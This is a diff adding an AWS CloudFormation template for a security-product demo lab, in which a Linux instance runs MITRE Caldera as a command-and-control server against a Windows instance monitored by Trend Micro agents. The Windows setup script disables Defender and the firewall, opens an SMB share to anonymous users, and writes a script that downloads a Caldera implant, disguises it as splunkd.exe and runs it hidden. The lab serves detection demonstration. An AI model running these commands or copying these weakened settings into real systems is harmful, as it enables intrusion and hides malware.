@@ -1,0 +1,283 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Description: 
+  This CloudFormation Template will help you creating an Demo Environment consisting on two Instances (1 Windows and 1 Linux).
+  The Linux VM will host the Mitre Caldera. This Intance will act as the C&C Server used to send malicious payloads and execute malicious commands on the Windows Instance.
+  This CFT will deploy (VisionOne and C1WS) to protect and monitor the Windows Instance.
+Parameters:
+  VisionOneURL:
+    Description: VisionOne - Please provide the Agent Installer URL.
+    Type: 'String'
+  TenantID:
+    Description: Cloud One - Please provide the Cloud One Workload Security Tenant ID (You can find this information using the C1WS > Deployment Scripts).
+    Type: 'String'
+  Token:
+    Description: Cloud One - Please provide the Cloud One Workload Security Activation Token (You can find this information using the C1WS > Deployment Scripts).
+    Type: 'String'
+  PolicyID:
+    Description: Cloud One - Please provide the Cloud One Workload Security Policy ID used to protect the Windows Instance (You can find this information using the C1WS > Deployment Scripts).
+    Type: 'String'  
+  KeyName:
+    Description: AWS - Select the Keypar used to create the EC2 Instances.
+    Type: AWS::EC2::KeyPair::KeyName
+  YourName:
+    Type: 'String'
+    Description: AWS - This information will be added to the instances names.
+  LatestWAmiId:
+    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
+    Default: '/aws/service/ami-windows-latest/Windows_Server-2019-English-Full-Base'
+    Description: (Windows AMI ID) DO NOT CHANGE THIS VALUE  
+  LatestLAmiId:
+    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
+    Default: '/aws/service/canonical/ubuntu/server/20.04/stable/current/amd64/hvm/ebs-gp2/ami-id'
+    Description: (Linux AMI ID) DO NOT CHANGE THIS VALUE
+  WindowsUsername:
+    Description: AWS - Please provide username to be used when accessing the Windows Instances.
+    Type: 'String'
+  WindowsPassword:
+    Description: AWS - Please provide the password to be used when accessing the Windows Instances (8 characters including capital case, lower cases and special characters).
+    Type: 'String' 
+Resources:
+  VPC1: 
+    Type: AWS::EC2::VPC
+    Properties: 
+      CidrBlock: 10.0.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+  VPC1Subnet1:
+    Type: AWS::EC2::Subnet
+    DependsOn: VPC1
+    Properties:
+      VpcId: !Ref VPC1
+      CidrBlock: 10.0.10.0/24
+  VPC1NatGWEIP:
+    Type: AWS::EC2::EIP
+    DependsOn: VPC1
+    Properties:
+      Domain: VPC1
+  VPC1NatGateway:
+   Type: AWS::EC2::NatGateway
+   DependsOn: 
+   - VPC1NatGWEIP
+   - VPC1Subnet1
+   Properties:
+     AllocationId: !GetAtt VPC1NatGWEIP.AllocationId
+     SubnetId: !Ref VPC1Subnet1
+  VPC1InternetGateway:
+    Type: AWS::EC2::InternetGateway
+  VPC1RouteTable:
+    Type: AWS::EC2::RouteTable
+    DependsOn: VPC1InternetGateway
+    Properties:
+      VpcId: !Ref VPC1
+  VPC1GatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    DependsOn: VPC1InternetGateway
+    Properties:
+      VpcId: !Ref VPC1
+      InternetGatewayId: !Ref VPC1InternetGateway
+  VPC1Route:
+    Type: AWS::EC2::Route
+    DependsOn: VPC1InternetGateway
+    Properties:
+      RouteTableId: !Ref VPC1RouteTable
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref VPC1InternetGateway
+  VPC1SubnetAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref VPC1RouteTable
+      SubnetId: !Ref VPC1Subnet1
+  VPC1SecurityGroupCaldera:
+    Type: AWS::EC2::SecurityGroup
+    DependsOn: VPC1
+    Properties:
+      GroupDescription: VPC1-CalderaSG
+      VpcId:
+        Ref: VPC1
+      SecurityGroupIngress:
+      - IpProtocol: tcp
+        FromPort: 8888
+        ToPort: 8888
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: tcp
+        FromPort: 80
+        ToPort: 80
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: tcp
+        FromPort: 7010
+        ToPort: 7012
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: udp
+        FromPort: 7010
+        ToPort: 7012
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: tcp
+        FromPort: 22
+        ToPort: 22
+        CidrIp: 10.0.0.0/16
+      - IpProtocol: tcp
+        FromPort: 8443
+        ToPort: 8443
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: tcp
+        FromPort: 8853
+        ToPort: 8853
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: tcp
+        FromPort: 8022
+        ToPort: 8022
+        CidrIp: 0.0.0.0/0
+      - IpProtocol: tcp
+        FromPort: 2222
+        ToPort: 2222
+        CidrIp: 0.0.0.0/0
+  VPC1SecurityGroupWindows: 
+    Type: AWS::EC2::SecurityGroup
+    DependsOn: VPC1
+    Properties:
+      GroupDescription: VPC1-WindowsSG
+      VpcId:
+        Ref: VPC1
+      SecurityGroupIngress:
+      - IpProtocol: tcp
+        FromPort: 3389
+        ToPort: 3389
+        CidrIp: 0.0.0.0/0
+  LinuxServer:
+    Type: 'AWS::EC2::Instance'
+    Properties:
+      InstanceType: t2.medium
+      KeyName: !Ref 'KeyName'
+      NetworkInterfaces:
+      - DeviceIndex: "0"
+        AssociatePublicIpAddress: "true"
+        DeleteOnTermination: "true"
+        SubnetId: !Ref VPC1Subnet1
+        GroupSet:
+        - !GetAtt VPC1SecurityGroupCaldera.GroupId
+      ImageId: !Ref 'LatestLAmiId'
+      Tags:
+      - Key: Name
+        Value: 
+            Fn::Join:
+            - "_"
+            - - XDR_LinuxServer
+              - !Ref YourName
+      UserData:
+        Fn::Base64:
+          !Sub |
+            #!/bin/bash
+            apt-get update -y
+            apt-get install docker.io -y
+            docker run --rm --name caldera -p 80:8888 -p 8888:8888 -p 8443:8443 -p 7010:7010 -p 7011:7011/udp -p 7012:7012 -p 8853:8853 -p 8022:8022 -p 2222:2222 andrefernandes86/tools-caldera
+  WindowsClient:
+    Type: 'AWS::EC2::Instance'
+    Properties:
+      InstanceType: t2.large
+      KeyName: !Ref 'KeyName'
+      NetworkInterfaces:
+      - DeviceIndex: "0"
+        AssociatePublicIpAddress: "true"
+        DeleteOnTermination: "true"
+        SubnetId: !Ref VPC1Subnet1
+        GroupSet:
+        - !GetAtt VPC1SecurityGroupWindows.GroupId
+      ImageId: !Ref 'LatestWAmiId'
+      Tags:
+      - Key: Name
+        Value: 
+            Fn::Join:
+            - "_"
+            - - XDR_WindowsClient
+              - !Ref YourName
+
+      UserData:
+        Fn::Base64:
+          !Sub |
+            <powershell>
+            # Disable Defender And Other Security Controls
+            Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
+            Start-Sleep -Seconds 2
+            Set-ExecutionPolicy Unrestricted -Force
+            Start-Sleep -Seconds 2
+            Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+            Start-Sleep -Seconds 2
+
+            # Vision One Endpoint Sensor Install
+            Invoke-WebRequest -Uri ${VisionOneURL} -OutFile c:\basecamp.exe
+            Start-Process c:\basecamp.exe
+            Start-Sleep -Seconds 10
+
+            # Google Chrome Installation
+            Invoke-WebRequest 'http://dl.google.com/chrome/install/375.126/chrome_installer.exe' -OutFile c:\chrome.exe
+            Start-Sleep -Seconds 10
+            Invoke-Expression "c:\chrome.exe /silent /install"
+            Start-Sleep -Seconds 10
+
+            # Create User
+            $Username = "${WindowsUsername}"
+            $Password = "${WindowsPassword}"
+
+            $group = "Administrators"
+
+            $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+            $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+            Start-Sleep -Seconds 5
+
+            if ($existing -eq $null) {
+
+                Write-Host "Creating new local user $Username."
+                & NET USER $Username $Password /add /y /expires:never
+                
+                Write-Host "Adding local user $Username to $group."
+                & NET LOCALGROUP $group $Username /add
+
+            }
+            else {
+                Write-Host "Setting password for existing local user $Username."
+                $existing.SetPassword($Password)
+            }
+            Start-Sleep -Seconds 5
+
+            Write-Host "Ensuring password for $Username never expires."
+            & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+            Start-Sleep -Seconds 5
+
+            # Add SMB share
+            New-Item -Path "c:\" -Name "ztsa" -ItemType "directory"
+            New-Item -Path c:\ztsa -Name "confidential.txt" -ItemType "file" -Value "Congratulations! You can now access these files using the Trend Micro ZTSA"
+            New-SmbShare -Name "ztsa" -Path "c:\ztsa" -FullAccess "Everyone","Guests","Anonymous Logon"
+            Grant-SmbShareAccess -Name "ztsa" -AccountName "Everyone" -AccessRight Full -Force
+
+            #Workload Security Install
+            Invoke-WebRequest https://app.deepsecurity.trendmicro.com:443/software/agent/Windows/x86_64/agent.msi -Outfile c:\c1.msi
+            
+            ######################################################################
+            ####### Please make sure you've selected the correct C1 Region #######
+            ######################################################################
+            $ACTIVATIONURL="dsm://agents.workload.trend-us-1.cloudone.trendmicro.com:443/" 
+            ################################# or ################################# 
+            #$ACTIVATIONURL="dsm://agents.deepsecurity.trendmicro.com:443/"
+            ######################################################################
+
+            $TENANTID="tenantID:${TenantID}"
+            $TOKEN="token:${Token}"
+            $POLICY="policyid:${PolicyID}"
+
+            Start-Process "msiexec.exe" -ArgumentList "/i c:\c1.msi /qn ADDLOCAL=ALL /l*v `"$env:LogPath\dsa_install.log`"" -Wait -NoNewWindow
+            Start-Sleep -Seconds 120
+            & $Env:ProgramFiles"\Trend Micro\Deep Security Agent\dsa_control" -a $ACTIVATIONURL $TENANTID $TOKEN $POLICY
+
+            # Add Caldera Shortcut
+            New-Item c:\users\default\desktop\caldera.ps1
+            Set-Content 'c:\users\default\desktop\caldera.ps1' '$server="http://$linux_ip"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f; rm -force "C:\Users\Public\splunkd.exe" -ea ignore; [io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null; Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;'  
+     
+            </powershell>
+
+Outputs:
+  WindowClientPublicIP:
+    Description: Use this IP address to access the Windows Client using RDP.
+    Value: !GetAtt WindowsClient.PublicIp
+  LinuxServerPublicIP:
+    Description: Use this IP address to access the Linux Client (http://LinuxServer.PublicIp - admin/admin).
+    Value: !GetAtt LinuxServer.PublicIp
